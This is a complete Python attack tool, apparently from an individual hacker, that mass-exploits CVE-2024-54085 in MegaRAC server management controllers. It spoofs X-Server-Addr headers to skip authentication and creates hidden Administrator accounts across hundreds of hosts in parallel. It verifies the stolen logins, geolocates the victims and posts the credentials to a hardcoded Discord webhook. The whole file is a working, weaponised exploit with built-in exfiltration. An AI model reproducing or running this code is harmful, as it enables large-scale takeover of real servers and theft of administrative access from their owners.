#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MegaRAC CVE-2024-54085 Exploit + Login Verification
Made by Hiro.null* — megaracs.txt: Auto-Numbered, Append-Only, Preserves Old
(+ is_alive / check_ip helpers for the Discord bot)
"""

import json
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor
import warnings
import time
from typing import Optional, Dict, List, Tuple
import logging
from datetime import datetime
import threading
import os
import re

# --------------------- CONFIG --------------------- #
CONFIG = {
    'THREAD_COUNT': 500,
    'IPS_FILE': 'ips.txt',
    'RESPONSE_LOG': 'response.log',
    'SUCCESS_LOG': 'megaracs.txt',
    'TIMEOUT': 3,
    'RETRY_ATTEMPTS': 2,
    'RETRY_DELAY': 1,
    'USERNAME_LENGTH': 8,
    'PASSWORD_LENGTH': 12,
    'RANDOMIZE_USERNAME': True,
    'WEBHOOK_URL': 'https://discord.com/api/webhooks/1432371084660838493/zc4qL-9GXAou0Mz0iMxiUChuOpVotyri2u1vIQIDIqNoi0UVsqUPax1No5bykTf-vRoG'
}

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

successes: List[Tuple[str, str, str, str]] = []
lock = threading.Lock()

LAV1 = "\033[38;2;203;166;247m"
LAV2 = "\033[38;2;180;142;230m"
LAV3 = "\033[38;2;157;118;213m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

BASE_PAYLOAD = {
    'Name': 'lan test',
    'Description': 'lan test',
    'Enabled': True,
    'Password': '',
    'RoleId': 'Administrator',
    'Locked': False,
    'PasswordChangeRequired': False
}

# --------------------- HELPERS --------------------- #
def generate_random_username(length: int = CONFIG['USERNAME_LENGTH']) -> str:
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_random_password(length: int = CONFIG['PASSWORD_LENGTH']) -> str:
    characters = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
    password = (
        random.choice(string.ascii_uppercase) +
        random.choice(string.ascii_lowercase) +
        random.choice(string.digits) +
        random.choice(string.punctuation) +
        ''.join(random.choice(characters) for _ in range(length - 4))
    )
    password_list = list(password)
    random.shuffle(password_list)
    return ''.join(password_list)

def get_geolocation(url: str) -> str:
    try:
        host = url.split("://")[-1].split("/")[0].split(":")[0]
        response = requests.get(f"http://ip-api.com/json/{host}", timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return f"{data.get('country', '?')}, {data.get('city', '?')} ({data.get('isp', '?')})"
        return "Unknown"
    except:
        return "Error"

def send_to_webhook(content: str):
    try:
        if not content.strip():
            requests.post(CONFIG['WEBHOOK_URL'], json={'content': "No new verified hits"})
            return
        chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
        for chunk in chunks:
            requests.post(CONFIG['WEBHOOK_URL'], json={'content': f"```{chunk}```"})
            time.sleep(1)
    except:
        pass

# --------------------- LOGIN VERIFICATION --------------------- #
def verify_login(url: str, username: str, password: str) -> bool:
    try:
        login_url = f"{url}/redfish/v1/SessionService/Sessions"
        r = requests.post(login_url, json={"UserName": username, "Password": password},
                          verify=False, timeout=5)
        return r.status_code == 201
    except:
        return False

# --------------------- EXPLOIT + VERIFY --------------------- #
def try_create_account(url: str, header: Dict[str, str]) -> Optional[Tuple[str, str, str]]:
    payload = BASE_PAYLOAD.copy()
    payload['UserName'] = generate_random_username() if CONFIG['RANDOMIZE_USERNAME'] else 'hiro69'
    payload['Password'] = generate_random_password()

    for retry in range(CONFIG['RETRY_ATTEMPTS'] + 1):
        try:
            response = requests.post(
                f'{url}/redfish/v1/AccountService/Accounts',
                json=payload, verify=False, headers=header, timeout=CONFIG['TIMEOUT']
            )

            response_info = {
                'timestamp': datetime.now().isoformat(),
                'url': url, 'header': header,
                'status_code': response.status_code,
                'username': payload['UserName'], 'password': payload['Password'],
            }
            with open(CONFIG['RESPONSE_LOG'], 'a') as f:
                f.write(json.dumps(response_info) + '\n')

            try:
                response_json = response.json()
            except:
                response_json = {}

            if response_json.get("UserName"):
                geo = get_geolocation(url)
                if verify_login(url, payload['UserName'], payload['Password']):
                    with lock:
                        successes.append((url, response_json['UserName'], payload['Password'], geo))
                    print(f"{GREEN}[+] VERIFIED → {url} | {response_json['UserName']}:{payload['Password']}{RESET}")
                    return (url, response_json['UserName'], payload['Password'])
                else:
                    print(f"{YELLOW}[!] CREATED BUT LOGIN FAILED → {url}{RESET}")
            else:
                print(f"{RED}[-] FAILED → {url} | {response.status_code}{RESET}")

            if retry < CONFIG['RETRY_ATTEMPTS']:
                time.sleep(CONFIG['RETRY_DELAY'])
        except Exception as e:
            logger.error(f"Error: {e}")
    return None

def process_ip(ip: str, single_scan: bool = False) -> None:
    try:
        ip = ip.strip()
        if not ip or ip.endswith('/'): ip = ip[:-1]
        if not ip.startswith(('http://', 'https://')): ip = f'https://{ip}'

        headers = [
            {'X-Server-Addr': '169.254.0.17:'},
            {'X-Server-Addr': '127.0.0.1:'},
            {'X-Server-Addr': '192.168.31.2:'}
        ]
        for header in headers:
            result = try_create_account(ip, header)
            if result and single_scan: break
    except Exception as e:
        logger.error(f"Error processing {ip}: {e}")

def normalize_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url

def load_previous_successes() -> set:
    prev = set()
    try:
        with open(CONFIG['SUCCESS_LOG'], 'r') as f:
            content = f.read()
            matches = re.findall(r"URL:\s*([^\s]+)", content)
            for url in matches:
                prev.add(normalize_url(url))
    except FileNotFoundError:
        pass
    except Exception as e:
        logger.error(f"Error reading previous: {e}")
    return prev

def get_next_number() -> int:
    try:
        with open(CONFIG['SUCCESS_LOG'], 'r') as f:
            content = f.read()
            numbers = re.findall(r"^(\d+)\.\s*VERIFIED", content, re.MULTILINE)
            return max(map(int, numbers)) + 1 if numbers else 1
    except:
        return 1

def read_ips(file_path: str) -> Optional[List[str]]:
    try:
        with open(file_path) as f:
            ips = list({l.strip() for l in f if l.strip()})
        return ips or None
    except:
        return None

def write_success_log():
    next_num = get_next_number()
    mode = 'a' if os.path.exists(CONFIG['SUCCESS_LOG']) else 'w'
    with open(CONFIG['SUCCESS_LOG'], mode) as f:
        if mode == 'w':
            f.write(f"{'#'*70}\n")
            f.write(f"# MEGA RAC VERIFIED EXPLOIT RESULTS\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'#'*70}\n\n")
        for i, (url, user, pwd, geo) in enumerate(successes, next_num):
            f.write(f"{i}. VERIFIED\n")
            f.write(f"{'-'*60}\n")
            f.write(f"Time: {datetime.now().strftime('%H:%M:%S')}\n")
            f.write(f"URL: {url}\n")
            f.write(f"User: {user}\n")
            f.write(f"Pass: {pwd}\n")
            f.write(f"Geo: {geo}\n")
            f.write(f"{'='*60}\n\n")
    new_content = ""
    with open(CONFIG['SUCCESS_LOG']) as f:
        lines = f.readlines()
        new_content = "".join(lines[-len(successes)*9:])
    send_to_webhook(new_content)

# ------------------- GRADIENT TUI ------------------- #
def banner():
    os.system('clear')
    print(f"{LAV1}╔{'═'*58}╗{RESET}")
    print(f"{LAV1}║{' '*58}║{RESET}")
    print(f"{LAV2}║  ███╗   ███╗ ██████╗ ███████╗ █████╗ ██████╗  █████╗  ██████╗  ║{RESET}")
    print(f"{LAV2}║  ████╗ ████║██╔════╝ ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝  ║{RESET}")
    print(f"{LAV3}║  ██╔████╔██║██║  ███╗█████╗  ███████║██████╔╝███████║██║       ║{RESET}")
    print(f"{LAV3}║  ██║╚██╔╝██║██║   ██║██╔══╝  ██╔══██║██╔══██╗██╔══██║██║       ║{RESET}")
    print(f"{LAV2}║  ██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║██║  ██║██║  ██║╚██████╗  ║{RESET}")
    print(f"{LAV2}║  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ║{RESET}")
    print(f"{LAV1}║{' '*58}║{RESET}")
    print(f"{LAV1}╚{'═'*58}╝{RESET}")
    print(f"{LAV2} CVE-2024-54085 + Login Verification + Append-Only{RESET}".center(60))

def menu():
    print(f"\n{LAV1}╔{'═'*48}╗{RESET}")
    print(f"{LAV1}║  [1] Run Scan                                 ║{RESET}")
    print(f"{LAV1}║  [2] Exit                                     ║{RESET}")
    print(f"{LAV1}╠{'═'*48}╣{RESET}")
    print(f"{LAV2}║  IP File: {CONFIG['IPS_FILE']:<37}║{RESET}")
    print(f"{LAV2}║  Threads: {CONFIG['THREAD_COUNT']:<37}║{RESET}")
    print(f"{LAV3}║  Mode:    {'SINGLE' if CONFIG.get('SINGLE_SCAN', False) else 'MULTI':<37}║{RESET}")
    print(f"{LAV3}║  Random:  {'YES' if CONFIG['RANDOMIZE_USERNAME'] else 'NO':<37}║{RESET}")
    print(f"{LAV1}╚{'═'*48}╝{RESET}\n")

def input_prompt(text: str, default=None):
    return input(f"{LAV2}{text}{RESET}").strip() or default

# ------------------- MAIN (standalone mode) ------------------- #
def main():
    banner()
    while True:
        menu()
        choice = input_prompt("Choose [1-2]: ", "1")
        if choice == "2":
            print(f"{LAV1}Goodbye! Stay safe, Hiro.null*{RESET}")
            break
        if choice != "1": continue

        CONFIG['IPS_FILE'] = input_prompt(f"IP File [{CONFIG['IPS_FILE']}]: ", CONFIG['IPS_FILE'])
        ips = read_ips(CONFIG['IPS_FILE'])
        if not ips:
            input(f"{RED}Press Enter...{RESET}")
            continue

        prev = load_previous_successes()
        filtered = [i for i in ips if normalize_url(i) not in prev]
        skipped = len(ips) - len(filtered)
        print(f"{LAV2}Loaded: {len(ips)} | Skipped: {skipped} | To Scan: {len(filtered)}{RESET}")

        CONFIG['THREAD_COUNT'] = int(input_prompt(f"Threads [{CONFIG['THREAD_COUNT']}]: ", str(CONFIG['THREAD_COUNT'])))
        mode = input_prompt("Mode [s/m]: ", "m")
        CONFIG['SINGLE_SCAN'] = mode.lower() == "s"
        CONFIG['RANDOMIZE_USERNAME'] = input_prompt("Random User? [y/n]: ", "y").lower() == "y"

        input(f"{LAV1}Press Enter to START...{RESET}")
        os.system('clear')
        banner()

        global successes
        successes = []

        print(f"{LAV2}Exploiting + Verifying {len(filtered)} fresh IPs...{RESET}\n")
        start = time.time()
        with ThreadPoolExecutor(max_workers=CONFIG['THREAD_COUNT']) as pool:
            pool.map(lambda ip: process_ip(ip, CONFIG['SINGLE_SCAN']), filtered)
        duration = time.time() - start

        if successes:
            write_success_log()

        print(f"\n{LAV1}{'═'*60}{RESET}")
        print(f"{LAV1} SCAN COMPLETE in {duration:.2f}s{RESET}")
        print(f"{GREEN} NEW VERIFIED: {len(successes)}{RESET}")
        print(f"{LAV2} RESULTS: {CONFIG['SUCCESS_LOG']} (append-only){RESET}")
        print(f"{LAV2} WEBHOOK: SENT{RESET}")
        print(f"{LAV1}{'═'*60}{RESET}")
        input(f"{LAV1}Press Enter to continue...{RESET}")
        os.system('clear')
        banner()

# ==================== BOT INTEGRATION HELPERS ==================== #

def is_alive(ip_or_url: str, timeout: float = 4.0) -> bool:
    """True if the host answers on Redfish at all (any HTTP status = alive)."""
    url = normalize_url(ip_or_url)
    try:
        r = requests.get(f"{url}/redfish/v1/", verify=False, timeout=timeout,
                         allow_redirects=True)
        return r.status_code < 600
    except Exception:
        return False

def check_ip(ip_or_url: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Full 100% vulnerability check.
    Returns (url, user, pass, geo) ONLY if the account is created AND login succeeds.
    Otherwise returns None.
    """
    url = normalize_url(ip_or_url)
    headers = [
        {'X-Server-Addr': '169.254.0.17:'},
        {'X-Server-Addr': '127.0.0.1:'},
        {'X-Server-Addr': '192.168.31.2:'},
    ]
    for h in headers:
        res = try_create_account(url, h)
        if res:
            user, pwd = res[1], res[2]
            return (url, user, pwd, get_geolocation(url))
    return None

if __name__ == "__main__":
    main()
